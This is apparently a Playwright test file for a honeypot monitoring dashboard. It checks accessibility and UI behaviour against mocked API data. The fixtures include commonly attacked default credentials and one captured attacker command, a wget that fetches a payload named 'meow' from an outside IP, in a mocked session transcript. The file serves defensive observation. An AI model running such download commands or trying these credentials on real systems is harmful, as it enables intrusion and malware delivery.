import { test, expect, type Page } from '@playwright/test'
import AxeBuilder from '@axe-core/playwright'

// Stub /api/v1/** with deterministic fixtures; keeps e2e hermetic while data-heavy views render real content for accessibility scan.

async function mockApi(page: Page): Promise<void> {
  await page.route('**/api/v1/**', async (route) => {
    const path = new URL(route.request().url()).pathname
    const json = (body: unknown) =>
      route.fulfill({
        status: 200,
        contentType: 'application/json',
        body: JSON.stringify(body),
      })

    if (path.endsWith('/stats/totals'))
      return json({ total_sessions: 42, total_auth_attempts: 99, unique_ips: 7 })
    if (path.endsWith('/stats/trend'))
      return json({ current: 42, previous: 30, delta: 12, pct_change: 40 })
    if (path.endsWith('/stats/top-passwords'))
      return json([
        { password: '123456', count: 10 },
        { password: 'root', count: 5 },
      ])
    if (path.endsWith('/stats/top-countries'))
      return json([{ country_code: 'US', country: 'United States', count: 8 }])
    if (path.endsWith('/stats/countries'))
      return json({
        countries: [
          {
            country_code: 'CN',
            country: 'China',
            sessions: 1200,
            distinct_ips: 50,
            attempts: 5000,
            successful: 6,
            success_rate: 0.12,
            distinct_usernames: 30,
            distinct_passwords: 96,
          },
          {
            country_code: 'US',
            country: 'United States',
            sessions: 400,
            distinct_ips: 200,
            attempts: 900,
            successful: 12,
            success_rate: 1.33,
            distinct_usernames: 18,
            distinct_passwords: 60,
          },
          {
            country_code: '??',
            country: 'Unknown',
            sessions: 80,
            distinct_ips: 40,
            attempts: 120,
            successful: 0,
            success_rate: 0,
            distinct_usernames: 5,
            distinct_passwords: 10,
          },
        ],
        total_countries: 2,
        geo_resolved_pct: 81.3,
      })
    if (path.endsWith('/stats/map'))
      return json({
        countries: [
          { a2: 'US', sessions: 400, ips: 200, success_rate: 1.33 },
          { a2: 'CN', sessions: 1200, ips: 50, success_rate: 0.12 },
        ],
        cities: [{ city: 'Amsterdam', lat: 52.4, lon: 4.9, sessions: 100, country_code: 'US' }],
      })
    const countryDetailMatch = path.match(/\/stats\/countries\/([A-Za-z]{2})$/)
    if (countryDetailMatch?.[1]) {
      const a2 = countryDetailMatch[1].toUpperCase()
      if (a2 !== 'US')
        return route.fulfill({
          status: 404,
          contentType: 'application/json',
          body: '{"code":404,"status":"Not Found","message":"Country not found"}',
        })
      return json({
        a2: 'US',
        name: 'United States',
        sessions: 400,
        ips: 200,
        attempts: 900,
        success_rate: 1.33,
        top_asns: [{ asn: 16276, as_org: 'OVH SAS', sessions: 88, distinct_ips: 12 }],
        top_credentials: [{ username: 'root', password: '123456', count: 140, distinct_ips: null }],
        daily: [
          { date: '2026-05-30', sessions: 9 },
          { date: '2026-05-31', sessions: 6 },
        ],
        top_cities: [{ city: 'Amsterdam', lat: 52.4, lon: 4.9, sessions: 100, country_code: 'US' }],
      })
    }
    if (path.endsWith('/stats/asns'))
      return json([
        { asn: 16276, as_org: 'OVH SAS', sessions: 88, distinct_ips: 12 },
        { asn: 4837, as_org: 'China Unicom', sessions: 40, distinct_ips: 8 },
      ])
    if (path.endsWith('/stats/ssh-clients'))
      return json([
        { client_version: 'SSH-2.0-Go', sessions: 252200 },
        { client_version: 'SSH-2.0-libssh_0.9.6', sessions: 54466 },
      ])
    if (path.endsWith('/stats/fingerprints'))
      return json([
        {
          fingerprint: 'd4:98:c4:f3:12:ef:3e:29:38:34:62:21:fd:99:ec:ef',
          fingerprint_type: 'ssh-rsa',
          sessions: 27,
          ips: 21,
          first_seen: '2026-03-10T00:00:00+00:00',
          last_seen: '2026-05-22T00:00:00+00:00',
        },
        {
          fingerprint: '04:c0:35:85:ac:f9:1c:5a:29:58:24:02:02:a7:df:5a',
          fingerprint_type: 'ssh-rsa',
          sessions: 4,
          ips: 1,
          first_seen: '2026-03-14T00:00:00+00:00',
          last_seen: '2026-05-18T00:00:00+00:00',
        },
      ])
    if (path.endsWith('/stats/downloads'))
      return json([
        {
          sha256: '8da193366e1554c08b2870c50f737b9587c3372b656151c4a96028af26f51334',
          name: 'meow',
          sessions: 69,
          first_seen: '2026-06-03T00:00:00+00:00',
          last_seen: '2026-07-23T00:00:00+00:00',
          machines: 4,
          countries: ['US', 'RU', 'CN'],
          host: null,
        },
        {
          sha256: '249512a11240bba571d1a474eb9e440249512a11240bba571d1a474eb9e4402',
          name: null,
          sessions: 1,
          machines: 1,
          first_seen: null,
          last_seen: null,
          countries: [],
          host: null,
        },
      ])
    if (path.endsWith('/stats/outcomes'))
      return json({
        shell: 120,
        commands: 40,
        tcpip: 30,
        downloads: 2,
        none: 8,
        total: 1000,
      })
    if (path.endsWith('/stats/tcpip-destinations'))
      return json([
        {
          network: 'Cloudflare',
          port: 53,
          sessions: 2933,
          hosts: 1,
          country: 'United States',
          country_code: 'US',
        },
        {
          network: 'ip-who.com',
          port: 80,
          sessions: 280,
          hosts: 4,
          country: null,
          country_code: null,
        },
        { network: null, port: 25, sessions: 12, hosts: 2, country: null, country_code: null },
      ])
    if (path.endsWith('/stats/activity'))
      return json([
        { bucket: '2026-05-29T00:00:00+00:00', count: 4 },
        { bucket: '2026-05-30T00:00:00+00:00', count: 9 },
        { bucket: '2026-05-31T00:00:00+00:00', count: 6 },
      ])
    if (path.endsWith('/stats/heatmap'))
      return json([
        { weekday: 0, hour: 13, count: 7 }, // Sunday = 0
        { weekday: 2, hour: 14, count: 12 },
      ])
    if (path.endsWith('/stats/top-credentials')) {
      const q = new URL(route.request().url()).searchParams
      if (q.get('outcome') === 'success')
        return json([{ username: 'root', password: 'toor', count: 3, distinct_ips: null }])
      if (q.get('metric') === 'ip_fanout')
        return json([
          { username: 'root', password: 'xc3511', count: 400, distinct_ips: 37 },
          { username: 'admin', password: 'admin', count: 120, distinct_ips: 1 },
        ])
      if (q.get('by') === 'password')
        return json([
          { username: null, password: 'hunter2', count: 64, distinct_ips: null },
          { username: null, password: '123456', count: 30, distinct_ips: null },
        ])
      if (q.get('by') === 'username')
        return json([
          { username: 'root', password: null, count: 220, distinct_ips: null },
          { username: 'admin', password: null, count: 90, distinct_ips: null },
        ])
      return json([
        { username: 'root', password: '123456', count: 140, distinct_ips: null },
        { username: 'admin', password: 'admin', count: 90, distinct_ips: null },
      ])
    }
    if (path.endsWith('/stats/auth-outcomes'))
      return json({
        total: 99,
        successful: 4,
        failed: 95,
        success_rate: 4.04,
        unique_passwords: 61,
        unique_usernames: 18,
      })
    if (path.endsWith('/stats/password-composition'))
      return json({
        total: 99,
        capped_at: 16,
        lengths: [
          { length: 4, count: 10 },
          { length: 6, count: 40 },
          { length: 8, count: 20 },
          { length: 16, count: 5 },
        ],
        classes: [
          { name: 'digits', count: 50 },
          { name: 'lower', count: 30 },
          { name: 'alnum', count: 19 },
        ],
      })
    if (path.endsWith('/stats/passwords-by-length'))
      return json([
        { password: '123456', count: 12 },
        { password: 'qwerty', count: 4 },
      ])
    // List endpoint has trailing slash; detail does not.
    if (path.endsWith('/sessions/'))
      return json({
        items: [
          {
            id: '726faaebd6b9',
            src_port: 45214,
            dst_port: 2222,
            protocol: 'ssh',
            country: 'United States',
            country_code: 'US',
            started_at: '2026-05-31T13:40:52+00:00',
            ended_at: '2026-05-31T13:41:50+00:00',
            auth_attempt_count: 1,
            command_count: 2,
            has_successful_login: true,
            category: 'active',
            n_commands: 2,
            n_downloads: 1,
            n_tcpip: 0,
            auth_success: true,
            interest: 12,
            asn_org: 'OVH SAS',
            client_version: 'SSH-2.0-libssh_0.9.6',
          },
        ],
        meta: { page: 1, pages: 1, per_page: 25, total: 1 },
      })
    const sessionMatch = path.match(/\/sessions\/([^/]+)$/)
    if (sessionMatch)
      return json({
        id: sessionMatch[1],
        src_port: 45214,
        dst_port: 2222,
        protocol: 'ssh',
        sensor: 'edge-01',
        country: 'United States',
        country_code: 'US',
        started_at: '2026-05-31T13:40:52+00:00',
        ended_at: '2026-05-31T13:41:50+00:00',
        auth_attempts: [
          {
            id: 1,
            username: 'admin',
            password: 'admin',
            success: true,
            timestamp: '2026-05-31T13:41:38+00:00',
          },
          ...Array.from({ length: 19 }, (_, i) => ({
            id: i + 2,
            username: `sprayed${i}`,
            password: `pw${i}`,
            success: false,
            timestamp: '2026-05-31T13:41:38+00:00',
          })),
        ],
        commands: [
          { id: 10, input: 'whoami', success: true, timestamp: '2026-05-31T13:41:49+00:00' },
          {
            id: 11,
            input: 'wget http://34.11.136.102/meow',
            success: true,
            timestamp: '2026-05-31T13:41:49+00:00',
          },
        ],
        downloads: [
          {
            id: 1,
            url: 'http://34.11.136.102/meow',
            sha256: '8da193366e1554c08b2870c50f737b9587c3372b656151c4a96028af26f51334',
            timestamp: '2026-05-31T13:41:51+00:00',
          },
        ],
      })

    return route.fulfill({
      status: 404,
      contentType: 'application/json',
      body: '{"code":404,"status":"Not Found","message":"Not Found"}',
    })
  })
}

// Dismiss the about overlay to avoid interference with axe scans and click targets.
async function dismissIntro(page: Page): Promise<void> {
  await page.getByRole('button', { name: 'Enter', exact: true }).click()
  await expect(page.getByRole('dialog', { name: 'About Honeywatch' })).toBeHidden()
}

async function expectAxeClean(page: Page): Promise<void> {
  // Mid-transition, colors interpolate and fail contrast checks on elements that are fine at rest.
  // Infinite keyframe animations never finish, so only CSS transitions are awaited.
  await page.waitForFunction(() =>
    document
      .getAnimations()
      .every((a) => !(a instanceof CSSTransition) || a.playState === 'finished'),
  )
  const results = await new AxeBuilder({ page })
    .withTags(['wcag2a', 'wcag2aa', 'wcag21aa'])
    .analyze()
  // Map to rule ids for a readable failure message instead of a giant object.
  expect(results.violations.map((v) => v.id)).toEqual([])
}

test.describe('dashboard accessibility smoke', () => {
  test.beforeEach(async ({ page }) => {
    await mockApi(page)
  })

  test('overview renders data and is axe-clean', async ({ page }) => {
    await page.goto('/')
    await dismissIntro(page)
    await expect(
      page.getByRole('img', { name: /World map of where attacks on the honeypot come from/i }),
    ).toBeVisible()
    await expect(page.locator('.stat-tile', { hasText: 'Sessions' })).toBeVisible()
    await expect(page.getByRole('heading', { name: /Live sessions/ })).toBeVisible()
    await expectAxeClean(page)
  })

  test('credentials (redesigned) renders the comb, what worked, and password anatomy, axe-clean', async ({
    page,
  }) => {
    await page.goto('/credentials')
    await dismissIntro(page)
    await expect(page.getByRole('heading', { level: 1, name: 'Credentials' })).toBeVisible()
    await expect(page.getByRole('heading', { level: 2, name: /Username and password pairs/ })).toBeVisible()
    await expect(page.getByRole('heading', { level: 2, name: 'What worked' })).toBeVisible()
    await expect(page.getByText('root:toor')).toBeVisible()

    await expect(page.getByRole('heading', { level: 2, name: 'Password anatomy' })).toBeVisible()

    // Drill into a length bucket; the view swap (no in-place reflow) must
    // clear hover tooltips to avoid a stale freeze-on-click.
    await page.getByRole('button', { name: /8 characters/ }).click()
    const drill = page.locator('.drill')
    await expect(drill.getByText('123456', { exact: true })).toBeVisible()
    await expect(drill.getByText('qwerty')).toBeVisible()
    const back = page.getByRole('button', { name: /Anatomy/ })
    await expect(back).toBeVisible()
    await expect(page.getByRole('tooltip')).toHaveCount(0)

    await expectAxeClean(page)

    await back.click()
    await expect(page.getByRole('button', { name: /8 characters/ })).toBeVisible()
  })

  test('origins renders the hive, drills into a country, toggles table and keys, axe-clean', async ({
    page,
  }) => {
    await page.goto('/origins')
    await dismissIntro(page)
    await expect(page.getByRole('heading', { level: 1, name: 'Origins' })).toBeVisible()
    await expect(page.getByRole('button', { name: /China/ })).toBeVisible()
    // Geo-less "Unknown" (?? sentinel) never gets a hex or a rank row.
    await expect(page.getByRole('button', { name: /Unknown/ })).toHaveCount(0)

    await page.getByRole('button', { name: /China/ }).click()
    // Focus moves into drawer on open (WCAG 2.4.3), hiding cell hover tooltips, so assert URL instead.
    // Close the drawer to avoid covering the Networks/SSH cards below.
    await expect(page).toHaveURL(/country=CN/)
    await page.keyboard.press('Escape')
    await expect(page).not.toHaveURL(/country=/)

    await page.getByRole('button', { name: 'Table', exact: true }).click()
    await expect(page.getByRole('table')).toBeVisible()

    // Mock ignores query params, so assert outgoing request has sort key (row order would falsely pass without refetch).
    // Verify aria-sort attribute moved.
    const sorted = page.waitForRequest(
      (r) => r.url().includes('/stats/countries') && r.url().includes('sort=ips'),
    )
    await page.getByRole('button', { name: 'Unique IPs' }).click()
    await sorted
    await expect(page.getByRole('columnheader', { name: 'Unique IPs' })).toHaveAttribute(
      'aria-sort',
      'descending',
    )

    await expectAxeClean(page)
    await expect(page.getByRole('button', { name: 'Hive', exact: true })).toBeVisible()
    await page.getByRole('button', { name: 'Hive', exact: true }).click()

    await expect(page.getByText('OVH SAS')).toBeVisible()

    await page.getByRole('button', { name: 'Reused keys', exact: true }).click()
    await expect(page.getByText(/d4:98:c4:f3/)).toBeVisible()

    await expectAxeClean(page)
  })

  test('payloads renders specimens, provenance KPI, and relay table, axe-clean', async ({
    page,
  }) => {
    await page.goto('/payloads')
    await dismissIntro(page)
    await expect(page.getByRole('heading', { level: 1, name: 'Payloads' })).toBeVisible()
    await expect(page.getByText('69 sessions from just 4 machines.')).toBeVisible()
    await expect(page.getByText(/Seen once, on/)).toBeVisible()
    await expect(page.getByText('Where payloads are hosted')).toHaveCount(0)
    await expect(page.getByText('Source URL recorded')).toHaveCount(0)
    await expect(page.getByText('Sessions that fetched a file')).toBeVisible()
    await expect(page.getByText('1 in 60 of the 120 that got control')).toBeVisible()
    await expect(page.getByRole('heading', { level: 2, name: 'Relay attempts' })).toBeVisible()
    await expect(page.getByText('ip-who.com')).toBeVisible()
    await expect(page.getByText('Unknown network')).toBeVisible()
    await expect(page.locator('.head-sha', { hasText: '249512a11240' })).toBeVisible()
    await expect(page.locator('.specimens .spec')).toHaveCount(2)
    // The whole card navigates to the sessions that captured this payload.
    // The overlay is a pseudo-element, so the VirusTotal anchor stays a
    // sibling - nesting them would be invalid HTML.
    await expect(page.locator('.spec').first().locator('a.spec-link')).toHaveAttribute(
      'href',
      /\/sessions\?sha256=8da193366e1554c08b2870c50f737b9587c3372b656151c4a96028af26f51334/,
    )
    await expect(page.locator('.spec').first().locator('a.vt')).toHaveCount(0)

    await expectAxeClean(page)
  })

  test('overview: selecting a country opens the intel drawer', async ({ page }) => {
    await page.goto('/')
    await dismissIntro(page)
    // SVG paths are the visual target; test the keyboard path (focus+Enter).
    // Scoped to the map itself - the live-sessions feed also has a button
    // mentioning "United States" (its own, differently-labeled entry), which
    // is correct/expected UI, not a bug to work around.
    const drill = page.locator('svg.worldmap').getByRole('button', { name: /United States/ })
    await drill.focus()
    await page.keyboard.press('Enter')
    await expect(page).toHaveURL(/country=US/)
    await expect(page.getByRole('heading', { level: 2, name: 'United States' })).toBeVisible()
    await expect(page.getByText('OVH SAS')).toBeVisible()
    await expectAxeClean(page)

    // Opening the drawer must move focus into it: otherwise a keyboard user has
    // to tab past every remaining country path to reach Close (measured at 14
    // presses in a two-country mock, hundreds with real data).
    await expect(page.getByRole('button', { name: 'Close' })).toBeFocused()

    await page.keyboard.press('Escape')
    await expect(page).not.toHaveURL(/country=/)
    // ...and focus returns to the country that opened it, rather than being
    // dropped on document.body where the next Tab restarts from the top.
    expect(await page.evaluate(() => document.activeElement?.tagName)).not.toBe('BODY')
  })

  test('overview: city dots meet the 24px minimum tap target', async ({ page }) => {
    await page.goto('/')
    await dismissIntro(page)
    // WCAG 2.5.8. Hit circles are sized in viewBox units, so on a 390px-wide
    // phone the whole 1600-unit viewBox is 0.24 CSS px per unit - without a
    // floor these come out at 2-3 px.
    const hit = page.locator('svg.worldmap .city-hit').first()
    await expect(hit).toBeAttached()
    const box = await hit.boundingBox()
    expect(box).not.toBeNull()
    expect(box!.width).toBeGreaterThanOrEqual(24)
    expect(box!.height).toBeGreaterThanOrEqual(24)
  })

  test('overview: the world cannot be dragged off screen at min zoom', async ({ page }) => {
    await page.goto('/')
    await dismissIntro(page)
    const scene = page.locator('svg.worldmap > g')
    // Mobile opens zoomed on Europe, so reset to the world view first - this
    // test is specifically about the clamp at k = minK.
    await page.getByRole('button', { name: 'Reset view' }).click()
    const before = await scene.getAttribute('transform')
    await page.locator('svg.worldmap').hover()
    await page.mouse.down()
    await page.mouse.move(2000, 1200, { steps: 10 })
    await page.mouse.up()
    // At k = minK the legal pan interval is a single point, so a drag is a
    // no-op. This fails for any future code path that writes tx/ty without
    // going through usePanZoom's commit().
    expect(await scene.getAttribute('transform')).toBe(before)
  })

  test('not-found renders and is axe-clean', async ({ page }) => {
    await page.goto('/this-route-does-not-exist')
    // Dismiss the overlay to avoid axe flakes during mid-fade snapshots.
    await dismissIntro(page)
    await expect(page.getByRole('heading', { level: 1, name: 'Page not found' })).toBeVisible()
    await expectAxeClean(page)
  })

  test('pulse renders the rhythm honeycomb and daily columns, filters by country, axe-clean', async ({
    page,
  }) => {
    await page.goto('/pulse')
    await dismissIntro(page)
    await expect(page.getByRole('heading', { level: 1, name: 'Pulse' })).toBeVisible()
    await expect(page.getByRole('heading', { level: 2, name: /Session rhythm/ })).toBeVisible()
    await expect(page.getByRole('heading', { level: 2, name: 'Daily sessions' })).toBeVisible()
    await expect(page.getByRole('heading', { level: 2, name: 'Readings' })).toBeVisible()

    await page.getByRole('button', { name: 'Country filter' }).click()
    await page.getByRole('option', { name: 'United States' }).click()
    await expect(page).toHaveURL(/country=US/)

    await expectAxeClean(page)

    await page.getByRole('link', { name: 'About' }).click()
    await expect(page.getByRole('dialog', { name: 'About Honeywatch' })).toBeVisible()
  })

  test('/activity redirects to /pulse', async ({ page }) => {
    await page.goto('/activity')
    await expect(page).toHaveURL(/\/pulse$/)
    await expect(page.getByRole('heading', { level: 1, name: 'Pulse' })).toBeVisible()
  })

  test('/countries redirects to /origins', async ({ page }) => {
    await page.goto('/countries')
    await expect(page).toHaveURL(/\/origins$/)
    await expect(page.getByRole('heading', { level: 1, name: 'Origins' })).toBeVisible()
  })

  test('sessions list expands a row and opens the full replay, IPs blotted, axe-clean', async ({
    page,
  }) => {
    await page.goto('/sessions')
    await dismissIntro(page)
    await expect(page.getByRole('heading', { level: 1, name: 'Sessions' })).toBeVisible()
    await expectAxeClean(page)

    // Rows expand in place (never navigate away) - the plan's core Sessions requirement.
    // The row is a treegrid row, not a button, and its accessible name is
    // prose ("Session from ...") - the 12-char id is deliberately decorative,
    // so filter on the visible text rather than the accessible name.
    const row = page.getByRole('row').filter({ hasText: '726faaebd6b9' })
    await row.click()
    await expect(row).toHaveAttribute('aria-expanded', 'true')

    const term = page.getByRole('log', { name: /transcript/i })
    await expect(term).toBeVisible()
    await expect(term).toContainText('whoami')
    await expect(term).toContainText('<ip>')
    await expect(term).not.toContainText('34.11.136.102')

    // The action button belongs to the transcript beside it, so the two
    // columns must end on the same line however long the credential spray is.
    // Desktop only - below 760px the panel deliberately stacks into one column.
    if (test.info().project.name !== 'mobile-chromium') {
      const bottoms = await page.evaluate(() => {
        const term = document.querySelector('.term')
        const actions = document.querySelector('.detail-actions')
        if (!term || !actions) return null
        return {
          term: Math.round(term.getBoundingClientRect().bottom),
          actions: Math.round(actions.getBoundingClientRect().bottom),
        }
      })
      expect(bottoms).not.toBeNull()
      expect(bottoms!.actions).toBe(bottoms!.term)
    }

    await expectAxeClean(page)

    // "Replay" is the explicit escape hatch to the full-page replay.
    await page.getByRole('link', { name: /^Replay/ }).click()
    await expect(page).toHaveURL(/\/sessions\/726faaebd6b9/)
    const replay = page.getByRole('region', { name: /^Replay of the/i })
    await expect(replay).toBeVisible()
    await expect(replay).toContainText('<ip>')
    await expect(replay).not.toContainText('34.11.136.102')
    await expectAxeClean(page)
  })

  test('sessions filters and sort drive the URL, axe-clean', async ({ page }) => {
    await page.goto('/sessions')
    await dismissIntro(page)
    await expect(page.getByRole('heading', { level: 1, name: 'Sessions' })).toBeVisible()

    // Story badges are a count plus an icon, so the visible text is just a
    // number; assert the accessible name that carries the meaning.
    await expect(page.getByLabel(/command(s)? typed/).first()).toBeVisible()

    // Outcome is a popover of checkboxes behind an "Outcome" trigger, not a
    // row of buttons: open it, then tick the box.
    await page.getByRole('button', { name: 'Outcome' }).click()
    // Delay the click to trigger the focus shift that closes the panel before the label's default action.
    await page.getByText('Got control').click({ delay: 120 })
    await expect(page.getByRole('checkbox', { name: 'Got control' })).toBeChecked()
    // ...and the panel stays open so more than one outcome can be picked.
    await expect(page.getByRole('checkbox', { name: 'Ran commands' })).toBeVisible()
    await expect(page).toHaveURL(/has=success/)
    // The panel stays open for multi-select; on a phone it covers the controls
    // below, so close it the way a user would before moving on.
    await page.keyboard.press('Escape')

    await page.getByRole('button', { name: 'Most interesting' }).click()
    await page.getByRole('option', { name: 'Most recent' }).click()
    await expect(page).toHaveURL(/sort=recent/)

    // The country dropdown is dropped below 760px on purpose - three controls
    // do not fit, and a removable chip stands in for it - so only drive it on
    // desktop, and assert the deliberate absence on mobile.
    const countryPicker = page.getByRole('button', { name: 'All countries' })
    if (test.info().project.name === 'mobile-chromium') {
      await expect(countryPicker).toHaveCount(0)
    } else {
      await countryPicker.click()
      await page.getByRole('option', { name: 'United States' }).click()
      await expect(page).toHaveURL(/country=US/)
    }

    // Reloading with these params in the URL restores the same filter state (URL is state).
    await page.reload()
    await expect(page.getByRole('button', { name: 'Outcome: Got control' })).toBeVisible()
    await page.getByRole('button', { name: 'Outcome: Got control' }).click()
    await expect(page.getByRole('checkbox', { name: 'Got control' })).toBeChecked()

    await expectAxeClean(page)
  })

  test('a failed sessions load shows the error boundary and recovers', async ({ page }) => {
    // Override with 500 (LIFO wins over beforeEach mock); suspense rejects to App-level ErrorBoundary.
    let fail = true
    // Regex distinguishes list (/sessions/?page=...) from detail (/sessions/<id>).
    await page.route(/\/api\/v1\/sessions\/(\?|$)/, async (route) => {
      if (fail)
        return route.fulfill({
          status: 500,
          contentType: 'application/json',
          body: '{"code":500,"status":"Internal Server Error","message":"boom"}',
        })
      return route.fallback()
    })

    await page.goto('/sessions')
    // List query retries 5xx twice with backoff before boundary catches.
    const alert = page.getByRole('alert')
    await expect(alert).toBeVisible({ timeout: 15_000 })
    await expect(alert).toContainText('Something went wrong')

    fail = false
    await alert.getByRole('button', { name: 'Try again' }).click()
    await expect(page.getByRole('heading', { level: 1, name: 'Sessions' })).toBeVisible()
  })
})
